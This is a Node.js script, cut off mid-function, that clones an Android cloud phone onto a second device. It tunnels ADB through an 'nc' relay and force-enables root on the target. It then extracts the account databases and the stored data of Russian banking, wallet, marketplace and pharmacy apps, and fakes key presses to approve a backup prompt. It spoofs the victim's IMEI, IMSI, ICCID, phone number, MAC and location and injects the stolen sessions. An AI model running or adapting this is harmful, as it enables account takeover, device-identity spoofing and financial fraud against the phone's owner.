#!/usr/bin/env node
/**
 * Full .220 Backup → Restore to D2
 * Tries methods in order: API pod backup → root extraction → ADB backup → hybrid
 */
const net = require('net');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

const { AK, SK, HOST, D1, D2, CT, SHD } = require('../shared/vmos_api');
const SRC_IP = '10.0.26.220';
const OUT = path.join(__dirname, '..', 'output', 'clone_220_data');

const APPS = [
  'com.yandex.bank', 'ru.ozon.app.android', 'ru.ozon.fintech.finance',
  'com.wildberries.ru', 'ru.yandex.taxi', 'ru.yoo.money', 'ru.cupis.wallet',
  'ru.apteka', 'ru.getpharma.eapteka', 'ru.rostel', 'ru.vk.store',
  'com.app.trademo', 'com.trademo.massmo',
];

const log = m => console.log(`[${new Date().toISOString().slice(11, 19)}] ${m}`);
const sleep = ms => new Promise(r => setTimeout(r, ms));
function ensureDir(d) { if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true }); return d; }

// ═══════════════════════════════════════════════════════════════
// VMOS Cloud API
// ═══════════════════════════════════════════════════════════════
function sign(b) {
  const xd = new Date().toISOString().replace(/[-:]/g, '').replace(/\.\d{3}Z$/, 'Z');
  const sd = xd.slice(0, 8), CT = 'application/json;charset=UTF-8', SHD = 'content-type;host;x-content-sha256;x-date';
  const bh = crypto.createHash('sha256').update(b, 'utf8').digest('hex');
  const can = `host:${HOST}\nx-date:${xd}\ncontent-type:${CT}\nsignedHeaders:${SHD}\nx-content-sha256:${bh}`;
  const ch = crypto.createHash('sha256').update(can, 'utf8').digest('hex');
  const sts = `HMAC-SHA256\n${xd}\n${sd}/armcloud-paas/request\n${ch}`;
  let k = crypto.createHmac('sha256', SK).update(sd).digest();
  k = crypto.createHmac('sha256', k).update('armcloud-paas').digest();
  k = crypto.createHmac('sha256', k).update('request').digest();
  return { 'content-type': CT, 'x-date': xd, 'x-host': HOST, 'authorization': `HMAC-SHA256 Credential=${AK}, SignedHeaders=${SHD}, Signature=${crypto.createHmac('sha256', k).update(sts).digest('hex')}` };
}
function apiPost(ep, d, t) {
  return new Promise(ok => {
    const b = JSON.stringify(d || {}); const h = sign(b); const buf = Buffer.from(b);
    const req = https.request({ hostname: HOST, path: ep, method: 'POST', headers: { ...h, 'content-length': buf.length }, timeout: (t || 60) * 1000 }, res => {
      let r = ''; res.on('data', c => r += c); res.on('end', () => { try { ok(JSON.parse(r)); } catch { ok({ code: -1, raw: r.slice(0, 300) }); } });
    });
    req.on('timeout', () => { req.destroy(); ok({ code: -99 }); });
    req.on('error', e => ok({ code: -99, msg: e.message }));
    req.write(buf); req.end();
  });
}

// ═══════════════════════════════════════════════════════════════
// ADB Stream to .220 via D1 relay
// ═══════════════════════════════════════════════════════════════
const A_CNXN=0x4e584e43,A_OPEN=0x4e45504f,A_OKAY=0x59414b4f,A_WRTE=0x45545257,A_CLSE=0x45534c43;
function makeHeader(cmd,a0,a1,dl,dc){const h=Buffer.alloc(24);h.writeUInt32LE(cmd,0);h.writeUInt32LE(a0,4);h.writeUInt32LE(a1,8);h.writeUInt32LE(dl,12);h.writeUInt32LE(dc,16);h.writeUInt32LE((cmd^0xFFFFFFFF)>>>0,20);return h;}
function crc(d){let s=0;for(let i=0;i<d.length;i++)s+=d[i];return s>>>0;}
function makeCnxn(){const p=Buffer.from('host::\x00');return Buffer.concat([makeHeader(A_CNXN,0x01000000,256*1024,p.length,crc(p)),p]);}
function makeOpen(lid,svc){const p=Buffer.from(svc+'\x00');return Buffer.concat([makeHeader(A_OPEN,lid,0,p.length,crc(p)),p]);}
function makeOkay(lid,rid){return makeHeader(A_OKAY,lid,rid,0,0);}
function makeWrte(lid,rid,data){return Buffer.concat([makeHeader(A_WRTE,lid,rid,data.length,crc(data)),data]);}
function parsePackets(buf){const pkts=[];let o=0;while(o+24<=buf.length){const cmd=buf.readUInt32LE(o),a0=buf.readUInt32LE(o+4),a1=buf.readUInt32LE(o+8),dl=buf.readUInt32LE(o+12);if(o+24+dl>buf.length)break;pkts.push({cmd,arg0:a0,arg1:a1,data:buf.slice(o+24,o+24+dl)});o+=24+dl;}return{packets:pkts,remaining:buf.slice(o)};}

function adbExec220(cmd, sec) {
  return new Promise(resolve => {
    let trid=null,srid=null,sc=false,done=false,res=Buffer.alloc(0),buf=Buffer.alloc(0),tb=Buffer.alloc(0);
    const sock=net.createConnection(8479,'127.0.0.1',()=>sock.write(makeCnxn()));
    const fin=()=>{if(done)return;done=true;clearTimeout(t);try{sock.destroy();}catch(e){}resolve(res.toString());};
    const t=setTimeout(fin,(sec||30)*1000);
    sock.on('data',chunk=>{buf=Buffer.concat([buf,chunk]);const{packets:pp,remaining:r}=parsePackets(buf);buf=r;
    for(const p of pp){if(p.cmd===A_CNXN&&!trid)sock.write(makeOpen(1,`exec:nc ${SRC_IP} 5555`));
    else if(p.cmd===A_OKAY&&p.arg1===1&&!trid){trid=p.arg0;setTimeout(()=>{const c=makeCnxn();sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,c.length,crc(c)),c]));},500);}
    else if(p.cmd===A_WRTE&&p.arg1===1){sock.write(makeOkay(1,trid));tb=Buffer.concat([tb,p.data]);const inner=parsePackets(tb);tb=inner.remaining;
    for(const ip of inner.packets){if(ip.cmd===A_CNXN&&!sc){sc=true;const q=Buffer.from('shell:'+cmd+'\x00');const op=Buffer.concat([makeHeader(A_OPEN,100,0,q.length,crc(q)),q]);sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,op.length,crc(op)),op]));}
    else if(ip.cmd===A_OKAY&&ip.arg1===100)srid=ip.arg0;
    else if(ip.cmd===A_WRTE&&ip.arg1===100){res=Buffer.concat([res,ip.data]);const ok=makeOkay(100,srid);sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,ok.length,crc(ok)),ok]));}
    else if(ip.cmd===A_CLSE)fin();}}else if(p.cmd===A_CLSE)fin();}});
    sock.on('error',fin);sock.on('close',fin);
  });
}

// Raw binary ADB exec — returns Buffer (for backup streams etc)
function adbExec220Raw(cmd, sec) {
  return new Promise(resolve => {
    let trid=null,srid=null,sc=false,done=false,res=Buffer.alloc(0),buf=Buffer.alloc(0),tb=Buffer.alloc(0);
    const sock=net.createConnection(8479,'127.0.0.1',()=>sock.write(makeCnxn()));
    const fin=()=>{if(done)return;done=true;clearTimeout(t);try{sock.destroy();}catch(e){}resolve(res);};
    const t=setTimeout(fin,(sec||30)*1000);
    sock.on('data',chunk=>{buf=Buffer.concat([buf,chunk]);const{packets:pp,remaining:r}=parsePackets(buf);buf=r;
    for(const p of pp){if(p.cmd===A_CNXN&&!trid)sock.write(makeOpen(1,`exec:nc ${SRC_IP} 5555`));
    else if(p.cmd===A_OKAY&&p.arg1===1&&!trid){trid=p.arg0;setTimeout(()=>{const c=makeCnxn();sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,c.length,crc(c)),c]));},500);}
    else if(p.cmd===A_WRTE&&p.arg1===1){sock.write(makeOkay(1,trid));tb=Buffer.concat([tb,p.data]);const inner=parsePackets(tb);tb=inner.remaining;
    for(const ip of inner.packets){if(ip.cmd===A_CNXN&&!sc){sc=true;const q=Buffer.from(cmd+'\x00');const op=Buffer.concat([makeHeader(A_OPEN,100,0,q.length,crc(q)),q]);sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,op.length,crc(op)),op]));}
    else if(ip.cmd===A_OKAY&&ip.arg1===100)srid=ip.arg0;
    else if(ip.cmd===A_WRTE&&ip.arg1===100){res=Buffer.concat([res,ip.data]);const ok=makeOkay(100,srid);sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,ok.length,crc(ok)),ok]));}
    else if(ip.cmd===A_CLSE)fin();}}else if(p.cmd===A_CLSE)fin();}});
    sock.on('error',fin);sock.on('close',fin);
  });
}

// ═══════════════════════════════════════════════════════════════
// MAIN
// ═══════════════════════════════════════════════════════════════
async function main() {
  console.log('═'.repeat(60));
  console.log('  FULL .220 BACKUP → RESTORE TO D2');
  console.log('═'.repeat(60));
  ensureDir(OUT);

  // ════════════════════════════════════════════════════════════
  // STEP 0: Pre-flight — verify D1 relay and D2 are alive
  // ════════════════════════════════════════════════════════════
  log('▶ STEP 0: Pre-flight checks');
  
  const d1Check = await syncCmd(D1, 'id; echo OK', 10);
  log('D1: ' + d1Check.split('\n')[0]);
  if (d1Check.startsWith('[ERR')) { log('FATAL: D1 not reachable'); return; }
  
  const d2Check = await syncCmd(D2, 'id; echo OK', 10);
  log('D2: ' + d2Check.split('\n')[0]);
  
  const relay220 = await adbExec220('id; echo RELAY_OK', 10);
  log('.220 relay: ' + relay220.split('\n')[0]);
  if (!relay220.includes('RELAY_OK') && !relay220.includes('uid=')) {
    log('FATAL: .220 relay not working');
    return;
  }

  // ════════════════════════════════════════════════════════════
  // STEP 1: Get .220's padCode
  // ════════════════════════════════════════════════════════════
  log('\n▶ STEP 1: Discover .220 padCode');
  
  const padCodeResult = await adbExec220(
    'getprop ro.boot.pad_code 2>/dev/null; echo "---"; ' +
    'getprop persist.sys.cloud.padcode 2>/dev/null; echo "---"; ' +
    'getprop ro.boot.padcode 2>/dev/null; echo "---"; ' +
    'getprop | grep -i pad 2>/dev/null; echo "---"; ' +
    'cat /data/local/tmp/*.conf 2>/dev/null | grep -i pad | head -5; echo "---"; ' +
    'cat /system/build.prop 2>/dev/null | grep -i pad | head -5; echo "---"; ' +
    'ls /data/local/tmp/ 2>/dev/null',
    15
  );
  log('padCode search result:\n' + padCodeResult);
  
  // Try more locations
  const padCodeExtra = await adbExec220(
    'getprop | grep -iE "pad_code|padcode|pad.code" 2>/dev/null; echo "==="; ' +
    'cat /data/vendor/xu/config 2>/dev/null | head -10; echo "==="; ' +
    'cat /data/xu_daemon.conf 2>/dev/null; echo "==="; ' +
    'find /data/local -name "*.conf" -o -name "*.cfg" -o -name "*.json" 2>/dev/null | head -10; echo "==="; ' +
    'cat /system/etc/prop.default 2>/dev/null | grep -i pad',
    15
  );
  log('Extra search:\n' + padCodeExtra);

  // Parse padCode
  let padCode220 = null;
  const padLines = padCodeResult.split('---');
  for (const line of padLines) {
    const clean = line.trim();
    if (clean.match(/^ACP[A-Z0-9]+$/)) {
      padCode220 = clean;
      break;
    }
  }
  
  if (!padCode220) {
    // Try grep output
    const match = (padCodeResult + padCodeExtra).match(/\[.*pad.*code.*\]:\s*\[([A-Z0-9]+)\]/i);
    if (match) padCode220 = match[1];
  }

  if (!padCode220) {
    // Try finding it from the neighbor list by matching phone/IMEI
    log('padCode not found via props. Searching neighbor list...');
    let allNeighbors = [];
    let lastId = 0;
    for (let p = 0; p < 20; p++) {
      const body = lastId > 0 ? { lastId, size: 50 } : { size: 50 };
      const r = await apiPost('/vcpcloud/api/padApi/padDetails', body);
      if (r.code !== 200 || !r.data?.pageData?.length) break;
      allNeighbors = allNeighbors.concat(r.data.pageData);
      lastId = r.data.lastId;
      if (!r.data.hasNext) break;
      await sleep(200);
    }
    log('Total devices in padDetails: ' + allNeighbors.length);
    
    // Try matching by testing syncCmd + checking IP
    const candidates = allNeighbors.filter(d => d.online === 1 && d.padCode !== D1 && d.padCode !== D2);
    log('Online candidates: ' + candidates.length);
    
    for (const c of candidates) {
      const r = await syncCmd(c.padCode, 'ip addr show eth0 2>/dev/null | grep "inet "; getprop persist.sys.cloud.phonenum', 8);
      if (r.includes('10.0.26.220') || r.includes('79286458086')) {
        padCode220 = c.padCode;
        log('✓ FOUND .220 padCode by IP/phone match: ' + padCode220);
        break;
      }
      await sleep(300);
    }
  }

  if (padCode220) {
    log('✓ .220 padCode: ' + padCode220);
    
    // ════════════════════════════════════════════════════════════
    // METHOD A: VMOS API Pod Backup/Restore
    // ════════════════════════════════════════════════════════════
    log('\n▶ METHOD A: VMOS API Pod Backup/Restore');
    
    // Check if backup API works
    const backupListR = await apiPost('/vcpcloud/api/padApi/localPodBackupSelectPage', { page: 1, rows: 10 });
    log('Backup list: ' + JSON.stringify(backupListR).slice(0, 300));
    
    // Try backup without OSS config first (maybe VMOS has default storage)
    const backupR = await apiPost('/vcpcloud/api/padApi/localPodBackup', { padCode: padCode220 });
    log('Backup attempt (no oss): ' + JSON.stringify(backupR).slice(0, 300));
    
    // Also check storage backup
    const storageBkp = await apiPost('/vcpcloud/api/padApi/vcTimingBackupList', {});
    log('Storage backup list: ' + JSON.stringify(storageBkp).slice(0, 300));

    if (backupR.code === 200) {
      log('✓ Backup started! Waiting for completion...');
      // Poll backup list
      for (let i = 0; i < 30; i++) {
        await sleep(10000);
        const list = await apiPost('/vcpcloud/api/padApi/localPodBackupSelectPage', { page: 1, rows: 10 });
        log('Backup poll [' + (i+1) + ']: ' + JSON.stringify(list).slice(0, 200));
        // Check if complete — look for our backup
        if (list.code === 200 && list.data) {
          const bkps = list.data.records || list.data.pageData || [];
          const done = bkps.find(b => b.status === 'completed' || b.status === 2);
          if (done) {
            log('✓ Backup complete! Restoring to D2...');
            const restoreR = await apiPost('/vcpcloud/api/padApi/localPodRestore', { padCode: D2, ...done });
            log('Restore: ' + JSON.stringify(restoreR).slice(0, 300));
            if (restoreR.code === 200) {
              log('✓ Restore started! Waiting...');
              await sleep(120000);
              // Verify
              await verifyD2();
              return;
            }
          }
        }
      }
      log('Backup did not complete in time, falling through to Method B');
    } else {
      log('Method A failed: ' + (backupR.msg || backupR.code));
    }

    // ════════════════════════════════════════════════════════════
    // METHOD B: Root on .220 via switchRoot → Full Extraction
    // ════════════════════════════════════════════════════════════
    log('\n▶ METHOD B: Enable root on .220 via switchRoot');
    
    // Enable root on .220
    const rootR = await apiPost('/vcpcloud/api/padApi/switchRoot', { 
      padCodes: [padCode220], rootStatus: 1, rootType: 1, packageName: 'com.android.shell' 
    });
    log('switchRoot on .220: ' + JSON.stringify(rootR).slice(0, 200));
    
    if (rootR.code === 200) {
      await sleep(5000);
      
      // Verify root
      const rootCheck = await syncCmd(padCode220, 'id', 10);
      log('.220 root check: ' + rootCheck);
      
      if (rootCheck.includes('uid=0')) {
        log('✓ ROOT ON .220! Full extraction starting...');
        await fullRootExtraction(padCode220);
        return;
      } else {
        log('.220 root not effective: ' + rootCheck);
        // Try via ADB relay too
        const relayRoot = await adbExec220('id', 10);
        log('.220 relay id: ' + relayRoot);
      }
    }
  } else {
    log('✗ .220 padCode not found');
  }

  // ════════════════════════════════════════════════════════════
  // METHOD C: ADB backup: service via relay
  // ════════════════════════════════════════════════════════════
  log('\n▶ METHOD C: ADB backup service via relay');
  await adbBackupMethod();
  
  // ════════════════════════════════════════════════════════════
  // METHOD D: Hybrid shell extraction (already partially done)
  // ════════════════════════════════════════════════════════════
  log('\n▶ METHOD D: Hybrid shell extraction + install on D2');
  await hybridMethod();
}

// ═══════════════════════════════════════════════════════════════
// METHOD B Implementation: Full root extraction from .220
// ═══════════════════════════════════════════════════════════════
async function fullRootExtraction(padCode220) {
  log('=== Full Root Extraction from .220 ===');
  ensureDir(path.join(OUT, 'root_extract'));
  
  // 1. Extract accounts_ce.db
  log('[B.1] Extracting accounts_ce.db...');
  const ceB64 = await syncCmd(padCode220, 'base64 /data/system_ce/0/accounts_ce.db 2>/dev/null', 30);
  if (ceB64.length > 100 && !ceB64.startsWith('[ERR')) {
    const ceFile = path.join(OUT, 'root_extract', 'accounts_ce.db');
    fs.writeFileSync(ceFile, Buffer.from(ceB64.replace(/\s/g, ''), 'base64'));
    log('  ✓ accounts_ce.db: ' + fs.statSync(ceFile).size + 'B');
  }
  
  // 2. Extract accounts_de.db
  log('[B.2] Extracting accounts_de.db...');
  const deB64 = await syncCmd(padCode220, 'base64 /data/system_de/0/accounts_de.db 2>/dev/null', 30);
  if (deB64.length > 100 && !deB64.startsWith('[ERR')) {
    const deFile = path.join(OUT, 'root_extract', 'accounts_de.db');
    fs.writeFileSync(deFile, Buffer.from(deB64.replace(/\s/g, ''), 'base64'));
    log('  ✓ accounts_de.db: ' + fs.statSync(deFile).size + 'B');
  }
  
  // 3. Extract app data for each package
  for (const pkg of APPS) {
    log('[B.3] Extracting ' + pkg + '...');
    const pkgDir = ensureDir(path.join(OUT, 'root_extract', pkg));
    
    // Get size estimate
    const duResult = await syncCmd(padCode220, `du -s /data/data/${pkg} 2>/dev/null`, 10);
    log('  Size: ' + duResult);
    
    // Tar + base64 the app data dir and stream via syncCmd
    // For small apps, this works in one shot
    const sizeMatch = duResult.match(/^(\d+)/);
    const sizeKb = sizeMatch ? parseInt(sizeMatch[1]) : 0;
    
    if (sizeKb > 0 && sizeKb < 5000) {
      // Small enough for direct base64 via syncCmd
      const tarB64 = await syncCmd(padCode220, 
        `cd /data/data/${pkg} && tar cf - . 2>/dev/null | base64`, 60);
      if (tarB64.length > 100 && !tarB64.startsWith('[ERR')) {
        const tarFile = path.join(pkgDir, 'data.tar.b64');
        fs.writeFileSync(tarFile, tarB64);
        log('  ✓ ' + pkg + ': ' + tarB64.length + ' b64 chars');
      }
    } else if (sizeKb >= 5000) {
      // Large — do chunked extraction
      log('  Large app (' + sizeKb + 'KB), extracting key files only...');
      
      // Extract databases
      const dbList = await syncCmd(padCode220, `ls /data/data/${pkg}/databases/ 2>/dev/null`, 10);
      const dbs = dbList.split('\n').filter(l => l.trim() && !l.startsWith('[ERR'));
      for (const db of dbs.slice(0, 10)) {
        const dbName = db.trim();
        const b64 = await syncCmd(padCode220, `base64 /data/data/${pkg}/databases/${dbName} 2>/dev/null`, 30);
        if (b64.length > 50 && !b64.startsWith('[ERR')) {
          ensureDir(path.join(pkgDir, 'databases'));
          fs.writeFileSync(path.join(pkgDir, 'databases', dbName), Buffer.from(b64.replace(/\s/g, ''), 'base64'));
          log('    ✓ db/' + dbName);
        }
      }
      
      // Extract shared_prefs
      const prefList = await syncCmd(padCode220, `ls /data/data/${pkg}/shared_prefs/ 2>/dev/null`, 10);
      const prefs = prefList.split('\n').filter(l => l.trim() && !l.startsWith('[ERR'));
      for (const pref of prefs.slice(0, 20)) {
        const prefName = pref.trim();
        const b64 = await syncCmd(padCode220, `base64 /data/data/${pkg}/shared_prefs/${prefName} 2>/dev/null`, 15);
        if (b64.length > 30 && !b64.startsWith('[ERR')) {
          ensureDir(path.join(pkgDir, 'shared_prefs'));
          fs.writeFileSync(path.join(pkgDir, 'shared_prefs', prefName), Buffer.from(b64.replace(/\s/g, ''), 'base64'));
          log('    ✓ prefs/' + prefName);
        }
      }
    }
    await sleep(500);
  }
  
  // 4. System settings
  log('[B.4] System settings...');
  const settings = await syncCmd(padCode220, 'settings list secure 2>/dev/null; echo "===SYSTEM==="; settings list system 2>/dev/null; echo "===GLOBAL==="; settings list global 2>/dev/null', 20);
  fs.writeFileSync(path.join(OUT, 'root_extract', 'settings_all.txt'), settings);
  
  // 5. Now inject everything into D2
  log('\n=== Injecting into D2 ===');
  await injectIntoD2();
}

// ═══════════════════════════════════════════════════════════════
// METHOD C Implementation: ADB backup via relay
// ═══════════════════════════════════════════════════════════════
async function adbBackupMethod() {
  log('=== ADB Backup via Relay ===');
  
  // First check which apps allow backup
  log('[C.1] Checking allowBackup flags...');
  for (const pkg of APPS) {
    const flags = await adbExec220(`dumpsys package ${pkg} 2>/dev/null | grep -E "flags=|allowBackup" | head -2`, 10);
    const allowBackup = flags.includes('ALLOW_BACKUP') || flags.includes('allowBackup=true');
    log('  ' + pkg + ': ' + (allowBackup ? '✓ backup allowed' : '✗ no backup') + ' — ' + flags.trim().slice(0, 80));
  }
  
  // Try ADB backup: service
  log('\n[C.2] ADB backup: service...');
  
  // First try a small app
  const testPkg = 'com.app.trademo';
  log('  Testing with ' + testPkg + '...');
  
  // The ADB backup: service format is: backup:<packages> [-apk] [-shared] etc
  const backupData = await adbExec220Raw('backup:' + testPkg, 30);
  log('  Backup result: ' + backupData.length + ' bytes');
  
  if (backupData.length > 50) {
    const header = backupData.slice(0, 50).toString('ascii').replace(/[^\x20-\x7e]/g, '.');
    log('  Header: ' + header);
    
    // Check for ANDROID BACKUP header
    if (header.startsWith('ANDROID BACKUP')) {
      log('  ✓ Valid Android backup format!');
      const backupFile = path.join(OUT, 'root_extract', testPkg + '.ab');
      ensureDir(path.join(OUT, 'root_extract'));
      fs.writeFileSync(backupFile, backupData);
      log('  Saved: ' + backupFile);
      
      // Try all apps
      for (const pkg of APPS) {
        if (pkg === testPkg) continue;
        log('  Backing up ' + pkg + '...');
        const data = await adbExec220Raw('backup:' + pkg + ' -apk', 60);
        if (data.length > 50) {
          const file = path.join(OUT, 'root_extract', pkg + '.ab');
          fs.writeFileSync(file, data);
          log('    ✓ ' + pkg + ': ' + data.length + 'B');
        } else {
          log('    ✗ ' + pkg + ': empty');
        }
        await sleep(1000);
      }
    } else {
      log('  Not a valid backup (maybe needs screen confirm)');
      
      // Try sending key event to confirm
      log('  Sending key event to .220 to confirm backup...');
      // Start backup in background and send confirmation key
      const bgBackup = adbExec220Raw('backup:' + testPkg, 30);
      await sleep(2000);
      await adbExec220('input keyevent 61; input keyevent 61; input keyevent 66', 5); // TAB TAB ENTER
      const bgResult = await bgBackup;
      log('  After confirm: ' + bgResult.length + ' bytes');
    }
  } else {
    log('  Empty backup — service may not be available');
  }
  
  // If backups were collected, restore them to D2
  const backupDir = path.join(OUT, 'root_extract');
  const abFiles = fs.existsSync(backupDir) ? fs.readdirSync(backupDir).filter(f => f.endsWith('.ab')) : [];
  if (abFiles.length > 0) {
    log('\n[C.3] Restoring ' + abFiles.length + ' backups to D2...');
    // For each .ab file, push to D2 and restore
    for (const ab of abFiles) {
      const abPath = path.join(backupDir, ab);
      try {
        execSync(`adb -s localhost:7391 push "${abPath}" /sdcard/${ab}`, { timeout: 60000 });
        const result = await syncCmd(D2, `bu restore /sdcard/${ab} 2>&1; echo DONE`, 30);
        log('  ' + ab + ': ' + result.slice(0, 80));
      } catch (e) {
        log('  ' + ab + ': push/restore failed');
      }
    }
  }
}

// ═══════════════════════════════════════════════════════════════
// METHOD D Implementation: Hybrid
// ═══════════════════════════════════════════════════════════════
async function hybridMethod() {
  log('=== Hybrid: Install APKs + Identity + Accounts on D2 ===');
  
  // Ensure D2 is online and has root
  const d2Status = await syncCmd(D2, 'id', 10);
  if (d2Status.startsWith('[ERR')) {
    log('D2 not ready yet, waiting...');
    for (let i = 0; i < 12; i++) {
      await sleep(15000);
      const r = await syncCmd(D2, 'id', 10);
      if (!r.startsWith('[ERR')) { log('D2 online: ' + r); break; }
      log('  [' + (i+1) + '] still waiting...');
    }
  }
  
  await apiPost('/vcpcloud/api/padApi/switchRoot', { padCodes: [D2], rootStatus: 1, rootType: 1, packageName: 'com.android.shell' });
  await sleep(3000);
  
  // 1. Clone identity
  log('[D.1] Clone identity...');
  const IDENTITY = {
    'persist.sys.cloud.imeinum': '895410082175508',
    'persist.sys.cloud.imsinum': '250990090080855',
    'persist.sys.cloud.iccidnum': '89701011747214753090',
    'persist.sys.cloud.phonenum': '79286458086',
    'persist.sys.cloud.macaddress': '14:7D:DA:67:40:69',
    'persist.sys.cloud.gps.lat': '45.42',
    'persist.sys.cloud.gps.lon': '36.77',
  };
  for (const [k, v] of Object.entries(IDENTITY)) {
    await syncCmd(D2, `setprop ${k} "${v}"`, 5);
  }
  await syncCmd(D2, 'settings put secure android_id a4141eb091e166bf', 5);
  
  const modemR = await apiPost('/vcpcloud/api/padApi/updatePadProperties', {
    padCodes: [D2],
    modemPropertiesList: [
      { propertiesName: 'imei', propertiesValue: '895410082175508' },
      { propertiesName: 'phonenum', propertiesValue: '79286458086' },
      { propertiesName: 'IMSI', propertiesValue: '250990090080855' },
      { propertiesName: 'ICCID', propertiesValue: '89701011747214753090' },
    ],
    locationPropertiesList: [
      { propertiesName: 'longitude', propertiesValue: '36.77' },
      { propertiesName: 'latitude', propertiesValue: '45.42' },
    ],
  });
  log('Identity set: ' + (modemR.code === 200 ? 'OK' : modemR.msg));
  
  // 2. Install APKs (via installApp API - most reliable)
  log('\n[D.2] Installing APKs...');
  const installed = await syncCmd(D2, 'pm list packages -3 2>/dev/null', 15);
  const installedSet = new Set(installed.split('\n').map(l => l.replace('package:', '').trim()).filter(Boolean));
  log('Currently installed: ' + installedSet.size);
  
  const missing = APPS.filter(p => !installedSet.has(p));
  if (missing.length > 0) {
    log('Installing ' + missing.length + ' missing apps via ADB...');
    const apkDir = path.join(OUT, 'apks');
    if (fs.existsSync(apkDir)) {
      for (const pkg of missing) {
        const apkFile = path.join(apkDir, pkg + '.apk');
        if (fs.existsSync(apkFile)) {
          try {
            log('  ' + pkg + ' (' + Math.round(fs.statSync(apkFile).size/1024/1024) + 'MB)...');
            execSync(`adb -s localhost:7391 install -r "${apkFile}"`, { timeout: 300000 });
            log('    ✓ installed');
          } catch (e) {
            log('    ✗ ' + (e.message || '').slice(0, 80));
          }
        }
      }
    }
  }
  
  // 3. Push accounts DBs
  log('\n[D.3] Push accounts DBs...');
  const ceDb = path.join(OUT, 'app_data', 'fresh_accounts_ce.db');
  const deDb = path.join(OUT, 'app_data', 'fresh_accounts_de.db');
  
  // If we have root-extracted DBs, prefer those
  const rootCe = path.join(OUT, 'root_extract', 'accounts_ce.db');
  const rootDe = path.join(OUT, 'root_extract', 'accounts_de.db');
  const useCe = fs.existsSync(rootCe) ? rootCe : ceDb;
  const useDe = fs.existsSync(rootDe) ? rootDe : deDb;
  
  if (fs.existsSync(useCe)) {
    try {
      execSync(`adb -s localhost:7391 push "${useCe}" /sdcard/acc_ce.db`, { timeout: 30000 });
      await syncCmd(D2, 'cp /sdcard/acc_ce.db /data/system_ce/0/accounts_ce.db && chown system:system /data/system_ce/0/accounts_ce.db && chmod 600 /data/system_ce/0/accounts_ce.db && rm /sdcard/acc_ce.db && echo OK', 15);
      log('  ✓ accounts_ce.db');
    } catch (e) {
      log('  ✗ CE push failed, using syncCmd fallback');
      const b64 = fs.readFileSync(useCe).toString('base64');
      await injectFileViaSyncCmd(D2, b64, '/data/system_ce/0/accounts_ce.db');
      await syncCmd(D2, 'chown system:system /data/system_ce/0/accounts_ce.db; chmod 600 /data/system_ce/0/accounts_ce.db', 10);
    }
  }
  
  if (fs.existsSync(useDe)) {
    try {
      execSync(`adb -s localhost:7391 push "${useDe}" /sdcard/acc_de.db`, { timeout: 30000 });
      await syncCmd(D2, 'cp /sdcard/acc_de.db /data/system_de/0/accounts_de.db && chown system:system /data/system_de/0/accounts_de.db && chmod 600 /data/system_de/0/accounts_de.db && rm /sdcard/acc_de.db && echo OK', 15);
      log('  ✓ accounts_de.db');
    } catch (e) {
      log('  ✗ DE push failed, using syncCmd fallback');
      const b64 = fs.readFileSync(useDe).toString('base64');
      await injectFileViaSyncCmd(D2, b64, '/data/system_de/0/accounts_de.db');
      await syncCmd(D2, 'chown system:system /data/system_de/0/accounts_de.db; chmod 600 /data/system_de/0/accounts_de.db', 10);
    }
  }

  // 4. Inject extracted app data if available
  log('\n[D.4] Inject app data...');
  const rootDir = path.join(OUT, 'root_extract');
  if (fs.existsSync(rootDir)) {
    for (const pkg of APPS) {
      const pkgDir = path.join(rootDir, pkg);
      if (!fs.existsSync(pkgDir)) continue;
      
      // Get target UID
      const uidStr = await syncCmd(D2, `stat -c %u /data/data/${pkg} 2>/dev/null || echo 0`, 5);
      const uid = uidStr.match(/^\d+$/) ? uidStr.trim() : '0';
      
      // Check for tar archive
      const tarFile = path.join(pkgDir, 'data.tar.b64');
      if (fs.existsSync(tarFile)) {
        log('  ' + pkg + ': injecting from tar...');
        const b64 = fs.readFileSync(tarFile, 'utf8');
        await injectFileViaSyncCmd(D2, Buffer.from(b64.replace(/\s/g, ''), 'base64').toString('base64'), '/data/local/tmp/app.tar');
        await syncCmd(D2, `cd /data/data/${pkg} && tar xf /data/local/tmp/app.tar 2>/dev/null; chown -R ${uid}:${uid} /data/data/${pkg} 2>/dev/null; rm -f /data/local/tmp/app.tar; echo OK`, 30);
        log('    ✓ tar extracted');
        continue;
      }
      
      // Or individual files
      const dbDir = path.join(pkgDir, 'databases');
      const prefDir = path.join(pkgDir, 'shared_prefs');
      let count = 0;
      
      if (fs.existsSync(dbDir)) {
        await syncCmd(D2, `mkdir -p /data/data/${pkg}/databases`, 5);
        for (const f of fs.readdirSync(dbDir)) {
          try {
            execSync(`adb -s localhost:7391 push "${path.join(dbDir, f)}" "/data/data/${pkg}/databases/${f}"`, { timeout: 30000 });
            count++;
          } catch {}
        }
      }
      
      if (fs.existsSync(prefDir)) {
        await syncCmd(D2, `mkdir -p /data/data/${pkg}/shared_prefs`, 5);
        for (const f of fs.readdirSync(prefDir)) {
          try {
            execSync(`adb -s localhost:7391 push "${path.join(prefDir, f)}" "/data/data/${pkg}/shared_prefs/${f}"`, { timeout: 30000 });
            count++;
          } catch {}
        }
      }
      
      if (count > 0) {
        await syncCmd(D2, `chown -R ${uid}:${uid} /data/data/${pkg}/databases /data/data/${pkg}/shared_prefs 2>/dev/null; restorecon -R /data/data/${pkg} 2>/dev/null`, 10);
        log('  ' + pkg + ': ' + count + ' files injected');
      }
    }
  }
  
  // 5. Restart account service (SAFE — kill process not stop/start)
  log('\n[D.5] Restarting account manager...');
  await syncCmd(D2, 'kill $(pidof com.android.server.telecom) 2>/dev/null; am broadcast -a android.accounts.LOGIN_ACCOUNTS_CHANGED 2>/dev/null; echo OK', 15);
  
  await sleep(5000);
  await verifyD2();
}

// Helper: inject file via syncCmd base64 chunks
async function injectFileViaSyncCmd(pad, b64Data, destPath) {
  const clean = b64Data.replace(/\s/g, '');
  const CHUNK = 3000;
  if (clean.length <= CHUNK) {
    return await syncCmd(pad, `printf '%s' '${clean}' | base64 -d > "${destPath}" && echo OK`, 15);
  }
  const tmp = `/data/local/tmp/inject_${Date.now()}.b64`;
  let r = await syncCmd(pad, `printf '%s' '${clean.slice(0, CHUNK)}' > "${tmp}" && echo OK`, 10);
